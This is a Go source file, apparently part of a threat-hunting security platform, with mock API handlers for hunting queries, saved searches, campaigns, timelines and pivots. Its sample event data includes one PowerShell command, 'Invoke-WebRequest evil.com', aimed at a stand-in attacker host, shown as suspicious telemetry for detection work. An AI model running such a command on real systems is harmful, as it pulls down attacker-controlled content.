package main

import (
	"fmt"
	"net/http"
	"time"

	"github.com/gin-gonic/gin"
)

// HuntingQuery representa uma query de hunting
type HuntingQuery struct {
	ID          string                 `json:"id"`
	Name        string                 `json:"name"`
	Description string                 `json:"description"`
	Query       QueryDefinition        `json:"query"`
	TimeRange   TimeRange              `json:"timeRange"`
	CreatedBy   string                 `json:"createdBy"`
	CreatedAt   time.Time              `json:"createdAt"`
	UpdatedAt   time.Time              `json:"updatedAt"`
	Tags        []string               `json:"tags"`
	Shared      bool                   `json:"shared"`
	Stats       HuntingQueryStats      `json:"stats"`
}

// QueryDefinition definição de query
type QueryDefinition struct {
	Type       string                 `json:"type"` // simple, advanced, dsl
	Conditions []QueryCondition       `json:"conditions"`
	Logic      string                 `json:"logic"` // AND, OR
	RawDSL     string                 `json:"rawDSL,omitempty"`
	Fields     []string               `json:"fields"` // campos a retornar
}

// QueryCondition condição de query
type QueryCondition struct {
	Field    string      `json:"field"`
	Operator string      `json:"operator"` // equals, contains, gt, lt, in, not_in
	Value    interface{} `json:"value"`
}

// TimeRange range de tempo
type TimeRange struct {
	Start string `json:"start"` // ISO 8601 ou "now-24h"
	End   string `json:"end"`   // ISO 8601 ou "now"
}

// HuntingQueryStats estatísticas de query
type HuntingQueryStats struct {
	TotalExecutions int       `json:"totalExecutions"`
	LastExecution   time.Time `json:"lastExecution"`
	AvgExecutionTime int      `json:"avgExecutionTime"` // ms
	ResultsFound    int       `json:"resultsFound"`
}

// SavedSearch busca salva
type SavedSearch struct {
	ID          string        `json:"id"`
	Name        string        `json:"name"`
	Description string        `json:"description"`
	Category    string        `json:"category"` // apt, ransomware, phishing, lateral_movement
	Query       HuntingQuery  `json:"query"`
	IsTemplate  bool          `json:"isTemplate"`
	CreatedBy   string        `json:"createdBy"`
	CreatedAt   time.Time     `json:"createdAt"`
	UpdatedAt   time.Time     `json:"updatedAt"`
	Shared      bool          `json:"shared"`
	Tags        []string      `json:"tags"`
}

// HuntingCampaign campanha de hunting
type HuntingCampaign struct {
	ID          string                 `json:"id"`
	Name        string                 `json:"name"`
	Description string                 `json:"description"`
	Hypothesis  string                 `json:"hypothesis"`
	Status      string                 `json:"status"` // active, completed, cancelled
	Priority    string                 `json:"priority"` // low, medium, high, critical
	Searches    []string               `json:"searches"` // IDs de saved searches
	Findings    []HuntingFinding       `json:"findings"`
	Team        []string               `json:"team"` // analistas envolvidos
	StartDate   time.Time              `json:"startDate"`
	EndDate     *time.Time             `json:"endDate,omitempty"`
	CreatedBy   string                 `json:"createdBy"`
	CreatedAt   time.Time              `json:"createdAt"`
	UpdatedAt   time.Time              `json:"updatedAt"`
	Tags        []string               `json:"tags"`
	Stats       HuntingCampaignStats   `json:"stats"`
}

// HuntingFinding achado de hunting
type HuntingFinding struct {
	ID          string                 `json:"id"`
	CampaignID  string                 `json:"campaignId"`
	Title       string                 `json:"title"`
	Description string                 `json:"description"`
	Severity    string                 `json:"severity"` // info, low, medium, high, critical
	Evidence    []Evidence             `json:"evidence"`
	MITRE       []string               `json:"mitre"` // técnicas MITRE
	IOCs        []string               `json:"iocs"`
	Entities    []Entity               `json:"entities"` // IPs, users, hosts envolvidos
	Status      string                 `json:"status"` // new, investigating, confirmed, false_positive
	CaseID      string                 `json:"caseId,omitempty"` // caso criado
	CreatedBy   string                 `json:"createdBy"`
	CreatedAt   time.Time              `json:"createdAt"`
	UpdatedAt   time.Time              `json:"updatedAt"`
}

// Evidence evidência de hunting
type Evidence struct {
	ID          string                 `json:"id"`
	Type        string                 `json:"type"` // event, log, screenshot, file
	Description string                 `json:"description"`
	Data        map[string]interface{} `json:"data"`
	Timestamp   time.Time              `json:"timestamp"`
	CollectedBy string                 `json:"collectedBy"`
}

// Entity entidade (IP, user, host, etc)
type Entity struct {
	Type  string `json:"type"` // ip, domain, user, host, process, file
	Value string `json:"value"`
	Count int    `json:"count,omitempty"`
}

// HuntingCampaignStats estatísticas de campanha
type HuntingCampaignStats struct {
	TotalSearches   int `json:"totalSearches"`
	TotalFindings   int `json:"totalFindings"`
	ConfirmedThreats int `json:"confirmedThreats"`
	CasesCreated    int `json:"casesCreated"`
	FalsePositives  int `json:"falsePositives"`
}

// HuntingResult resultado de busca
type HuntingResult struct {
	QueryID      string                   `json:"queryId"`
	TotalHits    int                      `json:"totalHits"`
	Events       []map[string]interface{} `json:"events"`
	Aggregations map[string]interface{}   `json:"aggregations"`
	ExecutionTime int                     `json:"executionTime"` // ms
	Timestamp    time.Time                `json:"timestamp"`
}

// HuntingTimeline timeline de eventos
type HuntingTimeline struct {
	Events    []TimelineEvent `json:"events"`
	StartTime time.Time       `json:"startTime"`
	EndTime   time.Time       `json:"endTime"`
	TotalEvents int           `json:"totalEvents"`
}

// TimelineEvent evento na timeline
type TimelineEvent struct {
	ID        string                 `json:"id"`
	Timestamp time.Time              `json:"timestamp"`
	Type      string                 `json:"type"`
	Summary   string                 `json:"summary"`
	Details   map[string]interface{} `json:"details"`
	Severity  string                 `json:"severity"`
	Entities  []Entity               `json:"entities"`
}

// PivotRequest requisição de pivot
type PivotRequest struct {
	EntityType  string `json:"entityType"`  // ip, domain, user, host
	EntityValue string `json:"entityValue"`
	PivotTo     string `json:"pivotTo"`     // tipo de entidade para pivotar
	TimeRange   TimeRange `json:"timeRange"`
}

// PivotResult resultado de pivot
type PivotResult struct {
	SourceEntity Entity   `json:"sourceEntity"`
	TargetEntities []Entity `json:"targetEntities"`
	TotalMatches int      `json:"totalMatches"`
	Events       []map[string]interface{} `json:"events"`
}

// HuntingStats estatísticas gerais de hunting
type HuntingStats struct {
	TotalSearches      int     `json:"totalSearches"`
	SavedSearches      int     `json:"savedSearches"`
	ActiveCampaigns    int     `json:"activeCampaigns"`
	TotalFindings      int     `json:"totalFindings"`
	ConfirmedThreats   int     `json:"confirmedThreats"`
	CasesCreated       int     `json:"casesCreated"`
	AvgSearchTime      int     `json:"avgSearchTime"` // ms
	TopHunters         []TopHunter `json:"topHunters"`
	TrendingSearches   []string    `json:"trendingSearches"`
}

// TopHunter analista mais ativo
type TopHunter struct {
	Name     string `json:"name"`
	Searches int    `json:"searches"`
	Findings int    `json:"findings"`
}

// handleExecuteHuntingQuery executa uma query de hunting
func (s *APIServer) handleExecuteHuntingQuery(c *gin.Context) {
	var query HuntingQuery
	if err := c.ShouldBindJSON(&query); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}

	// Mock search - em produção, executar query no Elasticsearch
	events := s.mockHuntingSearch(query)
	
	result := HuntingResult{
		QueryID:       fmt.Sprintf("qry-%d", time.Now().Unix()),
		TotalHits:     len(events),
		Events:        events,
		ExecutionTime: 234, // ms
		Timestamp:     time.Now(),
		Aggregations: map[string]interface{}{
			"by_severity": map[string]int{
				"critical": 12,
				"high":     45,
				"medium":   123,
				"low":      67,
			},
			"by_source": map[string]int{
				"firewall":  78,
				"ids":       56,
				"edr":       89,
				"syslog":    24,
			},
		},
	}

	c.JSON(http.StatusOK, result)
}

// mockHuntingSearch simula busca no Elasticsearch
func (s *APIServer) mockHuntingSearch(query HuntingQuery) []map[string]interface{} {
	// Mock data - eventos de exemplo
	events := []map[string]interface{}{
		{
			"id":        "evt-001",
			"timestamp": time.Now().Add(-2 * time.Hour),
			"type":      "network_traffic",
			"src_ip":    "192.168.100.50",
			"dst_ip":    "10.0.0.100",
			"dst_port":  443,
			"severity":  "high",
			"iocs":      []string{"192.168.100.50"},
			"mitre":     []string{"T1071"},
		},
		{
			"id":        "evt-002",
			"timestamp": time.Now().Add(-1 * time.Hour),
			"type":      "process_creation",
			"user":      "admin",
			"host":      "DESKTOP-001",
			"process":   "powershell.exe",
			"command":   "Invoke-WebRequest evil.com",
			"severity":  "critical",
			"mitre":     []string{"T1059"},
		},
		{
			"id":        "evt-003",
			"timestamp": time.Now().Add(-30 * time.Minute),
			"type":      "file_access",
			"user":      "admin",
			"host":      "DESKTOP-001",
			"file":      "C:\\Users\\admin\\Documents\\passwords.txt",
			"action":    "read",
			"severity":  "medium",
			"mitre":     []string{"T1005"},
		},
	}

	return events
}

// handleListSavedSearches lista saved searches
func (s *APIServer) handleListSavedSearches(c *gin.Context) {
	category := c.Query("category")
	
	// Mock data
	searches := []SavedSearch{
		{
			ID:          "search-001",
			Name:        "Suspicious PowerShell Activity",
			Description: "Detecta execução de PowerShell com comandos suspeitos",
			Category:    "apt",
			IsTemplate:  true,
			CreatedBy:   "system",
			CreatedAt:   time.Now().Add(-30 * 24 * time.Hour),
			Shared:      true,
			Tags:        []string{"powershell", "apt", "execution"},
		},
		{
			ID:          "search-002",
			Name:        "Lateral Movement Detection",
			Description: "Identifica movimentação lateral usando PSExec ou WMI",
			Category:    "lateral_movement",
			IsTemplate:  true,
			CreatedBy:   "system",
			CreatedAt:   time.Now().Add(-25 * 24 * time.Hour),
			Shared:      true,
			Tags:        []string{"lateral_movement", "psexec", "wmi"},
		},
		{
			ID:          "search-003",
			Name:        "Ransomware Indicators",
			Description: "Busca por indicadores de ransomware (criptografia em massa, extensões, etc)",
			Category:    "ransomware",
			IsTemplate:  true,
			CreatedBy:   "system",
			CreatedAt:   time.Now().Add(-20 * 24 * time.Hour),
			Shared:      true,
			Tags:        []string{"ransomware", "encryption", "malware"},
		},
		{
			ID:          "search-004",
			Name:        "Phishing Campaign Analysis",
			Description: "Identifica emails de phishing e vítimas",
			Category:    "phishing",
			IsTemplate:  true,
			CreatedBy:   "system",
			CreatedAt:   time.Now().Add(-15 * 24 * time.Hour),
			Shared:      true,
			Tags:        []string{"phishing", "email", "social_engineering"},
		},
		{
			ID:          "search-005",
			Name:        "C2 Beacon Detection",
			Description: "Detecta comunicação com servidores C2 baseado em padrões de beacon",
			Category:    "apt",
			IsTemplate:  true,
			CreatedBy:   "system",
			CreatedAt:   time.Now().Add(-10 * 24 * time.Hour),
			Shared:      true,
			Tags:        []string{"c2", "beacon", "apt"},
		},
	}

	// Filtrar por categoria se fornecida
	if category != "" {
		filtered := []SavedSearch{}
		for _, s := range searches {
			if s.Category == category {
				filtered = append(filtered, s)
			}
		}
		c.JSON(http.StatusOK, filtered)
		return
	}

	c.JSON(http.StatusOK, searches)
}

// handleCreateSavedSearch cria saved search
func (s *APIServer) handleCreateSavedSearch(c *gin.Context) {
	var search SavedSearch
	if err := c.ShouldBindJSON(&search); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}

	search.ID = fmt.Sprintf("search-%d", time.Now().Unix())
	search.CreatedAt = time.Now()
	search.UpdatedAt = time.Now()

	c.JSON(http.StatusCreated, search)
}

// handleListCampaigns lista campanhas
func (s *APIServer) handleListCampaigns(c *gin.Context) {
	status := c.Query("status")
	
	// Mock data
	campaigns := []HuntingCampaign{
		{
			ID:          "camp-001",
			Name:        "APT29 Indicators Hunt",
			Description: "Busca proativa por indicadores do grupo APT29 (Cozy Bear)",
			Hypothesis:  "APT29 pode ter comprometido infraestrutura via phishing",
			Status:      "active",
			Priority:    "high",
			Searches:    []string{"search-001", "search-002"},
			Team:        []string{"analyst1", "analyst2"},
			StartDate:   time.Now().Add(-7 * 24 * time.Hour),
			CreatedBy:   "analyst1",
			CreatedAt:   time.Now().Add(-7 * 24 * time.Hour),
			UpdatedAt:   time.Now(),
			Tags:        []string{"apt29", "nation_state", "russia"},
			Stats: HuntingCampaignStats{
				TotalSearches:    15,
				TotalFindings:    8,
				ConfirmedThreats: 3,
				CasesCreated:     3,
				FalsePositives:   2,
			},
		},
		{
			ID:          "camp-002",
			Name:        "Ransomware Prevention Hunt",
			Description: "Busca preventiva por indicadores de ransomware antes de incidente",
			Hypothesis:  "Podem existir indicadores de ransomware não detectados",
			Status:      "active",
			Priority:    "critical",
			Searches:    []string{"search-003"},
			Team:        []string{"analyst3", "analyst4"},
			StartDate:   time.Now().Add(-3 * 24 * time.Hour),
			CreatedBy:   "analyst3",
			CreatedAt:   time.Now().Add(-3 * 24 * time.Hour),
			UpdatedAt:   time.Now(),
			Tags:        []string{"ransomware", "prevention"},
			Stats: HuntingCampaignStats{
				TotalSearches:    8,
				TotalFindings:    4,
				ConfirmedThreats: 2,
				CasesCreated:     2,
				FalsePositives:   1,
			},
		},
		{
			ID:          "camp-003",
			Name:        "Insider Threat Investigation",
			Description: "Investigação de possível ameaça interna",
			Hypothesis:  "Usuário específico pode estar exfiltrando dados",
			Status:      "completed",
			Priority:    "high",
			Searches:    []string{"search-004"},
			Team:        []string{"analyst1", "analyst5"},
			StartDate:   time.Now().Add(-30 * 24 * time.Hour),
			EndDate:     timePtr(time.Now().Add(-15 * 24 * time.Hour)),
			CreatedBy:   "analyst5",
			CreatedAt:   time.Now().Add(-30 * 24 * time.Hour),
			UpdatedAt:   time.Now().Add(-15 * 24 * time.Hour),
			Tags:        []string{"insider_threat", "data_exfiltration"},
			Stats: HuntingCampaignStats{
				TotalSearches:    25,
				TotalFindings:    12,
				ConfirmedThreats: 1,
				CasesCreated:     1,
				FalsePositives:   8,
			},
		},
	}

	// Filtrar por status se fornecido
	if status != "" {
		filtered := []HuntingCampaign{}
		for _, c := range campaigns {
			if c.Status == status {
				filtered = append(filtered, c)
			}
		}
		c.JSON(http.StatusOK, filtered)
		return
	}

	c.JSON(http.StatusOK, campaigns)
}

// handleCreateCampaign cria campanha
func (s *APIServer) handleCreateCampaign(c *gin.Context) {
	var campaign HuntingCampaign
	if err := c.ShouldBindJSON(&campaign); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}

	campaign.ID = fmt.Sprintf("camp-%d", time.Now().Unix())
	campaign.CreatedAt = time.Now()
	campaign.UpdatedAt = time.Now()
	campaign.StartDate = time.Now()
	campaign.Stats = HuntingCampaignStats{}

	c.JSON(http.StatusCreated, campaign)
}

// handleGetTimeline retorna timeline de eventos
func (s *APIServer) handleGetTimeline(c *gin.Context) {
	// Mock timeline
	timeline := HuntingTimeline{
		StartTime: time.Now().Add(-24 * time.Hour),
		EndTime:   time.Now(),
		TotalEvents: 3,
		Events: []TimelineEvent{
			{
				ID:        "evt-001",
				Timestamp: time.Now().Add(-2 * time.Hour),
				Type:      "network_traffic",
				Summary:   "Suspicious outbound connection to 192.168.100.50",
				Severity:  "high",
				Entities: []Entity{
					{Type: "ip", Value: "192.168.100.50"},
					{Type: "host", Value: "DESKTOP-001"},
				},
			},
			{
				ID:        "evt-002",
				Timestamp: time.Now().Add(-1 * time.Hour),
				Type:      "process_creation",
				Summary:   "PowerShell executed with suspicious command",
				Severity:  "critical",
				Entities: []Entity{
					{Type: "user", Value: "admin"},
					{Type: "host", Value: "DESKTOP-001"},
					{Type: "process", Value: "powershell.exe"},
				},
			},
			{
				ID:        "evt-003",
				Timestamp: time.Now().Add(-30 * time.Minute),
				Type:      "file_access",
				Summary:   "Sensitive file accessed: passwords.txt",
				Severity:  "medium",
				Entities: []Entity{
					{Type: "user", Value: "admin"},
					{Type: "file", Value: "passwords.txt"},
				},
			},
		},
	}

	c.JSON(http.StatusOK, timeline)
}

// handlePivot realiza pivot entre entidades
func (s *APIServer) handlePivot(c *gin.Context) {
	var req PivotRequest
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}

	// Mock pivot result
	result := PivotResult{
		SourceEntity: Entity{
			Type:  req.EntityType,
			Value: req.EntityValue,
		},
		TotalMatches: 3,
		TargetEntities: []Entity{
			{Type: req.PivotTo, Value: "target-001", Count: 12},
			{Type: req.PivotTo, Value: "target-002", Count: 8},
			{Type: req.PivotTo, Value: "target-003", Count: 5},
		},
		Events: []map[string]interface{}{
			{
				"id":        "evt-pivot-001",
				"timestamp": time.Now().Add(-1 * time.Hour),
				"source":    req.EntityValue,
				"target":    "target-001",
			},
		},
	}

	c.JSON(http.StatusOK, result)
}

// handleGetHuntingStats retorna estatísticas de hunting
func (s *APIServer) handleGetHuntingStats(c *gin.Context) {
	stats := HuntingStats{
		TotalSearches:    1247,
		SavedSearches:    47,
		ActiveCampaigns:  5,
		TotalFindings:    234,
		ConfirmedThreats: 89,
		CasesCreated:     67,
		AvgSearchTime:    456, // ms
		TopHunters: []TopHunter{
			{Name: "analyst1@company.com", Searches: 234, Findings: 45},
			{Name: "analyst2@company.com", Searches: 189, Findings: 38},
			{Name: "analyst3@company.com", Searches: 156, Findings: 32},
		},
		TrendingSearches: []string{
			"Suspicious PowerShell Activity",
			"Lateral Movement Detection",
			"C2 Beacon Detection",
		},
	}

	c.JSON(http.StatusOK, stats)
}

// handleCreateFinding cria finding
func (s *APIServer) handleCreateFinding(c *gin.Context) {
	var finding HuntingFinding
	if err := c.ShouldBindJSON(&finding); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}

	finding.ID = fmt.Sprintf("finding-%d", time.Now().Unix())
	finding.CreatedAt = time.Now()
	finding.UpdatedAt = time.Now()

	c.JSON(http.StatusCreated, finding)
}
